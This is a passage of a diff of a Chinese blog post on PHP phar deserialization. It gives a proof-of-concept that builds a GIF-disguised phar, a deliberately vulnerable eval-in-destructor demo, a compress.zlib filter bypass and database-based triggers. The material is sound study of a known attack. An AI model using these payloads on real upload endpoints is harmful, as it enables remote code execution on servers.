called'</span>;<br><br>    }<br>}<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-string">'phar://phar.phar/test.txt'</span>;<br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113211612793.png" alt="image-20231113211612793"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/test.txt'</span><span class="token punctuation">;</span>
+<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113211612793.png" alt="image-20231113211612793"></p>
 <p>这里可以看到已经反序列化成功触发<code>__destruct</code>方法并且读取了文件内容。其他函数也是可以的，就不一一试了，</p>
 <p>如果题目限制了，<code>phar://</code>不能出现在头几个字符。可以用<code>Bzip / Gzip</code>协议绕过。</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">'compress.zlib://phar://phar.phar/test.txt'</span>;<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113212809318.png" alt="image-20231113212809318"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.zlib://phar://phar.phar/test.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113212809318.png" alt="image-20231113212809318"></p>
 <p>虽然会警告但仍会执行，它同样适用于<code>compress.bzip2://</code>。</p>
 <p>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作，极大的拓展了反序列化攻击面。</p>
 <h2 id="2-5-触发反序列化之操作文件的touch">2.5 触发反序列化之操作文件的touch</h2>
@@ -589,59 +615,157 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
 <li><code>getimagesizefromstring</code></li>
 </ul>
 <h3 id="zip">zip</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$zip = new ZipArchive();<br>$res = $zip-&gt;open('c.zip');<br>$zip-&gt;extractTo('phar://test.phar/test');<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$zip = new ZipArchive();
+$res = $zip-&gt;open('c.zip');
+$zip-&gt;extractTo('phar://test.phar/test');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1>0x03 举例分析</h1>
 <h2 id="3-1-本地测试">3.1 本地测试</h2>
 <p><strong>利用条件</strong>.</p>
 <p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.phar文件要能够上传到服务器端。<br>2.如`file_exists()，fopen()，file_get_contents()，file()`等文件操作的函数要有可用的魔术方法作为"跳板"。<br>3.文件操作函数的参数可控，且:`:、/、phar`等特殊字符没有被过滤。<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1.phar文件要能够上传到服务器端。
+2.如`file_exists()，fopen()，file_get_contents()，file()`等文件操作的函数要有可用的魔术方法作为"跳板"。
+3.文件操作函数的参数可控，且:`:、/、phar`等特殊字符没有被过滤。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里先用smi1e师傅的demo做个例子。</p>
 <p><a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/">php反序列化攻击拓展</a></p>
 <p><strong>例一、</strong></p>
 <p>upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>]==<span class="hljs-string">"image/gif"</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>], <span class="hljs-string">'.'</span>)+<span class="hljs-number">1</span>))== <span class="hljs-string">'gif'</span>) {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Upload: "</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Type: "</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Temp file: "</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">"upload_file/"</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]))<br>      {<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>] . <span class="hljs-string">" already exists. "</span>;<br>      }<br>    <span class="hljs-keyword">else</span><br>      {<br>      <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<br>      <span class="hljs-string">"upload_file/"</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Stored in: "</span> . <span class="hljs-string">"upload_file/"</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];<br>      }<br>    }<br><span class="hljs-keyword">else</span><br>  {<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">"Invalid file,you can only upload gif"</span>;<br>  }<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Upload: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Type: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Temp file: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload_file/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+      <span class="token punctuation">{</span>
+      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token string double-quoted-string">"upload_file/"</span> <span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Stored in: "</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"upload_file/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token keyword">else</span>
+  <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>upload_file.html</p>
-<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://localhost/upload_file.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Upload"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost/upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$filename</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'please input a filename'</span>.<span class="hljs-string">'&lt;br /&gt;'</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>{<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">'echo "ok";'</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span> -&gt; output);<br>    }<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)){<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>();<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'file is not exists'</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'please input a filename'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br /&gt;'</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">AnyClass</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "ok";'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'file is not exists'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>该demo环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法<code>__destruct()</code>以及文件操作函数<code>file_exists()</code>，而</p>
 <p>且在AnyClass类中调用了eval，以此用来命令执行，我们知道以上条件正好满足利用条件。</p>
 <p>根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为</p>
 <p>gif，上传到服务器，然后利用file_exists，使用phar://执行代码</p>
 <p>poc.php</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>{<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">'echo "ok";'</span>;<br>}<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"GIF89a"</span>.<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">'phpinfo();'</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231113215703702.png" alt="image-20231113215703702"></p>
-<p><img src="image-20231113220205457.png" alt="image-20231113220205457"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">AnyClass</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "ok";'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
+<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
+<span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">output</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
+<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
+<span class="token comment">//签名自动计算</span>
+<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113215703702.png" alt="image-20231113215703702"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113220205457.png" alt="image-20231113220205457"></p>
 <p>这里搞完，发现那位师傅就去分析了tp5.2版本的pop链对phar反序列化的利用，由于这里我没学习tp框架，暂时不搞了，后续学了再来更新</p>
 <h2 id="3-2-导致phar触发的其他地方-sql">3.2 导致phar触发的其他地方(sql)</h2>
 <h3 id="Postgres">Postgres</h3>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span>, <span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"root"</span>));<br>@<span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">pgsqlCopyFromFile</span>(<span class="hljs-string">'aa'</span>, <span class="hljs-string">'phar://test.phar/aa'</span>);<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。</p>
 <h3 id="MySQL">MySQL</h3>
 <p><code>LOAD DATA LOCAL INFILE</code>也会触发phar造成反序列化，在今年的<a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>，上面说的N1CTF2019 题目sql_manage考的也是这个点，我们仍然使用最上面那个例子。</p>
